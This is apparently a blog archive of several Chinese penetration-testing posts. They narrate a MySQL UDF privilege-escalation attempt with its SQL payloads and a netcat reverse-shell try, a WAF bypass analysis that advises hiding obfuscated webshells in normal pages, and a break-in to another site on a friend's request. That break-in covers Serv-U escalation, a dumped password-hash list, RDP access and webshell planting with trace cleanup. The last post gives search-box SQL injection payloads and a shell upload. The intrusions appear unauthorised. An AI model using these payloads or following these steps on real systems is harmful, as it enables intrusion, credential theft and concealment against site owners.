<p>目录。很悲剧的是。</p>

<p>好吧。我们至少还有root。     前面我们提到，mysql的root可以通过创建函数执行系统命令。     我们可不可以利用</p>

<p>这个呢     查了下资料。估计是光棍当得太久了当衰了。没查到。。     果断问问几个好基友和攻城狮牛。。     好吧。</p>

<p>Haxxxxxxxx。。。是个大好银[（据说是高富帅喔）。学学Strong哥的写法。]        他给了我指了条路。原先他在</p>

<p>上年度发了一个python利用工具。也就是第六弹。     里面可以自动创建lib/plugin目录。     俺欣喜若狂啊。这时</p>

<p>已经大半夜了。     果断准备安下win下的python环境。     这时人品问题来了。。。nnd，网断了。。。</p>

<p>这就好比你都脱了那啥，那表演的人就给你看那啥。     你懂得。     无奈。。。洗洗睡了。     次日，也就是今天。起床了</p>

<p>继续搞。     安装了下win的python环境。。。话说本来想在linux下搞得。一直是总是缺这个缺那个的。     本屌怒了</p>

<p>。。以后不在上面试了。。貌似linux下有的模块win下都有。还更齐全。     安装完毕，启动exp。准备发射。</p>

<p>好吧。。啥JB人品。。。试了几次不是不能连就是拒绝。     话说开了外连的，难道是IP被拒绝了？     尝试了下</p>

<p>允许所有IP外链</p>

<p><strong>mysql&gt; grant all privileges on <em>.</em> to ‘yourname’@’%’ identified by ‘youpasswd’;</strong>
<strong>mysql&gt; flush privileges;</strong>
NO RESULT。还是老样子。不能连。
看来介个exp用不成了。   但是我们要知道。EXP最终利用的还是语句。拿到语句我们可以本地手工开啊</p>

<p>我看了下源代码。找到了（当然haxxxxxx机油后来也发给我那语句了。）
<strong>select ‘xxx’ into outfile '%s/lib::$INDEX_ALLOCATION'</strong>
这句和haxxxxxx写的不是完全一样。因为他当时正忙着其他事，敲得代码不一定对。所以 当时以我后来</p>

<p>在搜集的资料总结为准。     本语句的是利用报错式的插入。将某不存在的东西插入插件目录lib，因为lib目录</p>

<p>是不存在 的。所以它会因为报错给但是给建立一个相应的目录。Plugin的目录建立同上。   于是乎。我按这个</p>

<p>思路走。</p>

<p>恩恩。看样子有前人来过了。Mysql5.xx默认是没有这个目录的       不过后面就有些悲剧了。   最后导出udf.Dll时显示</p>

<p>Can not open or write 那啥udf.dll。。   小弟尝试用load_file将其导出也出错。。。不知道是哪里被限制了    好嘛，</p>

<p>我们先来看看能不能直接执行命令。   利用Function创建CMDSHELL，报错。仍继续、</p>

<p>Game Over。。 CMDSHELL不存在。    介个情况有两种说法    一种是组件被禁用。还有一种是。。你懂得。UDF没成功。</p>

<p>实在没法了。后来试图反弹一个shell回本机，用nc监听端口。    好吧。。连服务器公网转发都省了。又直接报错。
到了这里也到了尾声了。基本上能试的都试过了。高版本Mysql的提权法就那几种。   在我搞得那个被另外一大神确诊</p>

<p>为root亦不可写的目录里，实在是没搞下来。   有机油给我提过LPK以及MOF。大同小异。目录被封杀了，至少在我这里无解。
最后想了想，估计也让只有牛牛们的exp可能将其拿下吧</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[对 WAF系统“网站安全狗”的浅探]]></title>
      <url>/pentest/2013/03/12/safedogbypass/</url>
      <content type="html"><![CDATA[<p>大家看了就图一乐呵，小弟没能写出特别高深的东西，权当抛砖引玉吧。
这两天在探究NIDS和WAF的机制，打算交论文啊。鄙人很是头疼，因为编程水平有限，接触不到太深层的东西。 比如基于服务器扩展的API—-ISPAI, 作为一个提供的DLL，驻留在WWW服务器中的程序代码，其扩展WWW服务 器的功能与CGI相同，而大大提高了运行效率和安全性，我们耳熟能详的那些WAF系统应该就是采用了它作为对Web 的接口进行有效防御。
但是作为Web安全爱好者，所关心的并不是底层的编程漏洞，我们需要关注的是对于规则库的研究和他的防御机制。 所以，有了以下的这篇文章。
为了测试，我先尝试搭建了“IIS版网站安全狗”。虽然有些大神说安全狗并不太好。但毕竟它与护卫神和一流防护 等软件也让不少人头痛过，我们仍可以将它作为探究的一个引子。另外，对于防注入和其他功能，Apache版本的和IIS版本 的其实只是在条款上的区别，请不要纠结。
无图无真相：</p>

<p>或许，不知道我说错木有，部分爱好Web安全的机油对于安全狗又爱又恨，爱的是寻求突破的过程，恨的是为了对付它 蛋蛋隐隐作痛。为了绕过它，有些机油们做的猜测盲目有些盲目，类似于管中窥豹得不到全貌。所以有些尝试并不太有效。     我们这里对他的部分功能进行简单分析：</p>

<p><strong>主动防御：</strong></p>

<p>大家可以看到，在网站安全狗里，主动防御提供sql注入防御模块儿的最新官方规则库主要有三大类：XSS注入，菜刀执行 和sql注入。可限制url长度上限。每个规则可自定义url注入、cookie注入以及post注入的检测选项。在这里提一下。url检测就是 做出对get注入传参和xss的防御。举个例子，也就是说，我们如果取得了某项特殊的注入，通过对比官方对于三项的限制。理论 上是可以在绕不过url的时进行post注入的。
而且，由于工具虽然有专门对于菜刀的拦截，但是并非全版本有效，同时，我们也有可能尝试其他特殊的一句话客户端。</p>

<p><strong>对于主动防御的网马防护模块：</strong></p>

<p>我们可以看到，在其中对于文件名做了单独防御。部分同志通过burp绕过了上传。有的童鞋通过文件包含突破，或是利用解析漏洞 创建畸形文件夹和文件。在这里其实有一个小点，因为安全狗默认禁止了浏览畸形文件，一般童鞋尝试普通的畸形文件解析是不行的。 但它并特别限制畸形目录，所以可以在目录名前后做文章，注释或者那啥，大神们有空去研究喔。</p>

<p><strong>对于文件后缀的防御：</strong></p>

<p>撸主看了下，上传防御那啥居然没有限制和.com、.cmd、.bat，部分危险脚本后缀也未做限制，这让小弟着实抹了一把汗。至于其他的 后缀只要没特定限制的话，是可以通过上传后改名的。</p>

<p>值得一提的是，安全狗有主动网马查杀功能，机油们在得到Webshell以后，并不要轻易放松。小弟指的是Webshell不免杀的情况。 某个倒霉孩子千辛万苦通过神马copy以及文件包含等诸多手段得到Webshell以后。前脚刚擦完屁股，乐颠乐颠地去吃饭，后脚管理就给删了， 这种情况并不算少见。所以，做好免杀，或者在正常页面插入免杀一句话（阴暗角落你懂得）是小弟比较推荐的。插数据库滴事儿还是建议 能免则免。
曾见过不少机油手握安全狗专杀工具，眼红ing。。。毕竟，拿到webshell后能K掉狗后续工作能方便许多。
至于其他监控模块，有点忍不住要吐槽一下流量防。毕竟是网站保护软件，做硬防和流量防护自然由NIDS和机房防火墙管理。如果个人测试 也不用管流量神马的了。这功能用在这里的话实在有些鸡肋。还有CC防模块，有时正常访问某网站它也会抽风，耍赖瘫痪，确实做的不算特别专业。
最后，安全狗有个防爬虫功能和前面说到的CC防是需要注意的。我们扫描时发送请求时线程最好调低一些，一味追求快恐怕最后只得蛋疼地换IP了。
另外，本来想反编译安全狗的数据文件，分析下它的规则库，奈何水平有限，期待大神做有效尝试。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[一次拿shell引发的提权]]></title>
      <url>/pentest/2013/03/12/getshellpentest/</url>
      <content type="html"><![CDATA[<p>昨儿有个盆友发来一个站的shell，说让我拿下同服的另一个shell，当时正好有事儿，所以昨晚人家都睡了才开始看看~</p>

<p>那个站和目标站是同一套cms的，我喜滋滋的先去问问盆友到底咋进的后台，人家一句话把我噎着了，默认帐密。。好吧，估计进了后台拿shell不难。</p>

<p>于是乎。</p>

<p>NND，其实也想到了，默认帐密和post注入都不行。不然人家扔给本菜干嘛。。</p>

<p>好吧</p>

<p>前台去看看~</p>

<p>加了一个‘或者and 3=4 、and 3=3</p>

<p>连个回显都木有</p>

<p>看来get注入是行不通了。</p>

<p>XSS最近很流行的说本来想试试</p>

<p>可人家催的急，这玩意儿弄cookie等太久了就算了</p>

<p>用盆友的大马上了个一句话看看</p>

<p>E盘跨不鸟</p>

<p>权限不够</p>

<p>不过可以看看其他盘</p>

<p>你说我该哭还是该笑？</p>

<p>有360，但是也有serv-u</p>

<p>好吧</p>

<p>试试serv-u默认帐密提权</p>

<p>盆友的坑爹老马不给力只能测出不支持php,aspx，jsp..汗一个。。</p>

<p>自己传了个能让serv-u利用的脚本</p>

<p>执行命令</p>

<p>成功！</p>

<p>用户加进了管理组。。</p>

<p>这里插一句</p>

<p>登陆时有个小插曲</p>

<p>本地连接2那个才能用，盆友还对我说估计是可能另一个是内网用的？</p>

<p>好吧。。大概吧</p>

<p>喜滋滋的去登陆</p>

<p>好吧。。它限制登陆。。说只有远程用户组才能登陆。。</p>

<p>坑爹。。</p>

<p>难道管理组不是默认远程用户组？</p>

<p>好吧</p>

<p>我又把他加入了TelnetClient组。。</p>

<p>无果。。</p>

<p>郁闷啊。。</p>

<p>难道是系统策略限制？</p>

<p>看看补丁吧</p>

<p>试着扔几把神器上去。。</p>

<p>330多个</p>

<p>估计没准儿有戏</p>

<p>看了下</p>

<p>也没去扫可写</p>

<p>直接进的C:/RECYCLE</p>

<p> </p>

<p>好吧。当时我心凉了一半</p>

<p> </p>

<p>那儿已经有前辈的神器躺着了</p>

<p> </p>

<p>还是试了下。。</p>

<p> </p>

<p>另外几个也一样。</p>

<p>没被杀结果被拦了</p>

<p>好吧</p>

<p>Nnd肿么办。。</p>

<p>陷入了沉思。。</p>

<p>我们要的是权限，拿到权限我们就可一OOXX。</p>

<p>改了管理密码神马的</p>

<p>小弟心肠不差。只想挖出他的管理密码hash就成。。</p>

<p>问了一个机油。。</p>

<p>他让我lpk劫持</p>

<p>注册表读sys键值神马的</p>

<p>可惜据他说lpk被人捷足先登、注册表读sys貌似被人限制了</p>

<p>读普通的远程3389端口键值神马的还行。。</p>

<p>一时间陷入无限郁闷，难道就这么算了？</p>

<p>突然。。灵光一闪。。</p>

<p>一拍大腿。。尼玛。先前的serv-u不就是sys权限。。</p>

<p>又脑残了。。</p>

<p>果断上了个pwdump</p>

<p>好</p>

<p>开始抓hash。。</p>

<p>不负众望啊。。</p>

<p> </p>

<p>———————————————BEGIN DUMP ——————————————–</p>

<p> </p>

<p>admin:1008:F0D412BD764FFE81AAD3H3IS451404EE:209C6174DA490CAEB422F3FA5A7AE634:::</p>

<p> </p>

<p>IWAM_KQYB-8JHKJ33W7W:1004:3C1E371BE839ECF544448CAB912DE14B:D245FA59D90CDD1A2F33DC97CE662301:::</p>

<p> </p>

<p>IUSR_KQYB-8JHKJ33W7W:1003:3E164BAEBC96C258A4C39808F5B3C18F:257B69A2D7FFDDCB14BADB94B67CFA2B:::</p>

<p> </p>

<p>SUPPORT_388945a0:1001:AAD3B423GH3404EEAAD3B435B51404EE:2147A411C657AB3C97586A4EC0B43B64:::</p>

<p> </p>

<p>Guest:501:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</p>

<p> </p>

<p>Administrator:500:6294749A6F5CF3021AA818381F293IE:DABBB86911FE613D9509F6F3D7C4C487:::</p>

<p> </p>

<p>———————————————-END DUMP —————————-</p>

<p> </p>

<p>咳咳。。在这里批注下</p>

<p>那个贴出来的hash值因为为了避免某些不必要的麻烦</p>

<p>已经被我改了一部分</p>

<p>大家不用去试了。。。</p>

<p>拿到hash解密出来了。。激动ing。。。</p>

<p>        Mstsc你们懂得。。</p>

<p> </p>

<p>好吧</p>

<p>这管理怪蜀黍还在这儿登qq。。。</p>

<p>现在就是帮人拿目标站的shell了</p>

<p>先前没echo进去，在此说明下。。</p>

<p>结果。。</p>

<p>在c、d、e、f盘里查询目标站站名关键字。。坑爹</p>

<p>居然没有。。</p>

<p>试着去手动找一下。</p>

<p>好吧</p>

<p>我眼神不好没看到。</p>

<p>肿么办</p>

<p>其实鄙人又脑残了把</p>

<p>大家应该都看到桌面的iis管理器了</p>

<p>打开了你们都懂的</p>

<p>看图</p>

<p>果断读出物理路径。。</p>

<p>在目标站上了个一句话。。</p>

<p>然后清理屁股，删recycle里的东东</p>

<p>各种淫荡你们懂得。</p>

<p>向盆友交差咯。。</p>

<p>手上没有好点的后门，就没上了。</p>

<p>不会免杀好桑心。。</p>

<p>看那位大大施舍个免杀的好用点的后门给我。。</p>

<p>就这样吧。</p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[一次菜级渗透]]></title>
      <url>/pentest/2013/03/12/initpentest/</url>
      <content type="html"><![CDATA[<p>RT，小菜前天碰到一个百度收录较为前面的asp站,突然萌发了想练练手的想法，于是乎有了下面的文章。</p>

<p>稍微手工了下，url栏输入’以及3=3和3=4返回正常。</p>

<p>但是浏览器显示脚本错误。蛋疼，大概没有注入吧。</p>

<p> </p>

<p>啊D和haviji齐上。</p>

<p>悲剧的是没反应，数据库无法猜解。而且注入点也没出来。</p>

<p>小菜没法，掏出神器御剑以及大字典狂扫不已。</p>

<p>扫下。。木有编辑器，估计都被删了或者改名了。</p>

<p>不一会儿。后台出来了。</p>

<p>猜解弱口令。。这管理员还是蛮变态的，连个漏子都没得。用户名和密码都没得捡。怎么办呢。</p>

<p>回到前台。突然发现搜索栏还没有检测，啊。。。没准儿有门儿。</p>

<p>在搜索栏加了个  ’</p>

<p>报错。。唉。貌似有门儿。</p>

<p>继续法克之~</p>

<p>搜索框里：</p>

<p>输入</p>

<p>1%’and(select count(*)from admin_user)&gt;0 and ‘%’=’</p>

<p>猜出表名。</p>

<p>admin_user</p>

<p>1%’and(select top 1 len(username)from admin_user) and ‘%’=’</p>

<p>猜出用户名字段</p>

<p>username</p>

<p>1%’and(select top 1 len(pwd)from admin_user) and ‘%’=’</p>

<p>猜出密码字段</p>

<p>pwd</p>

<p>余下的就不一一列举了。</p>

<p>手注猜用户。。很蛋疼的说。</p>

<p>于是乎掏出另一个神器WVS</p>

<p>扫啊扫啊、、</p>

<p>老外的东西是好用。就是操作有点蛋疼，崩溃了数次。</p>

<p>Table –&gt;Colunum-&gt;Data</p>

<p>都是半自动自动注入的。不过猜解时显得有点慢。</p>

<p>上图</p>

<p>（图已挂掉）</p>

<p>大约4分钟后</p>

<p>跑出了数个字段</p>

<p>其中就包括手注的pwd和username</p>

<p>PS:</p>

<p>其实，后来发现在url栏换种方法就可以注入的。“Exists”并没有过滤。</p>

<p>直接显示值, 可以通过报错 和 返回不存在 来判断是否有那个字段。</p>

<p>经验不足、</p>

<p>⊙﹏⊙b汗</p>

<p>但猜出的表是木有admin_user</p>

<p>但有users  有点怪</p>

<p>拿到帐密顺利进入后台。</p>

<p>蛋疼的是。。他后台木有样式添加。木有单页添加</p>

<p>只好找上传。不出所料。。图片上传和文件上传都是白名单过滤。</p>

<p>肿么办。。iis6.0服务器，但截断用不了。过滤老。</p>

<p>好吧。。</p>

<p>Winsock抓包上传。。有上传漏洞，用nc提交。。</p>

<p> </p>

<p>回显结果。。</p>

<pre class="brush:python;">
HTTP/1.1 405 Not Allowed 
Server: nginx/0.8.53 
Date: Wed, 25 Jul 2012 18:33:00 GMT 
Content-Type: text ml Content-Length: 575 
Connection: close


&lt; html&gt; 
&lt; head&gt;
&lt;title&gt;405 Not Allowed&lt;/title&gt;
&lt;/head&gt; 
&lt; body bgcolor="white"&gt; 
&lt; center&gt;
&lt;h1&gt;405 Not Allowed&lt;/h1&gt;
&lt;/center&gt;
&lt; hr&gt;
&lt;center&gt;nginx/0.8.53&lt;/center&gt; 
&lt; /body&gt; 
&lt; ml&gt; &lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; &lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; &lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; 
&lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; 
&lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt; &lt; !-- a padding to disable MSIE and Chrome friendly error page --&gt;
</pre>

<p>====================================================================</p>

<p> </p>

<p> </p>

<p>无奈，不知道是他抽风还是我抽风。</p>

<p> </p>

<p>换吧。把抓包的信息填进明小子。。</p>

<p> </p>

<p>再试一次。。</p>

<p> </p>

<p>OK..这次人品还不太差。</p>

<p> </p>

<p>顺利拿到shell….上大马；</p>

<p>至于服务器就没去提了。。实在太卡了。。跳转目录也会抽风。</p>

<p> </p>
]]></content>
      <categories>
        
          <category> pentest </category>
        
      </categories>
      <tags>
        
      </tags>
      <tags></tags>
    </entry>
  
</search>
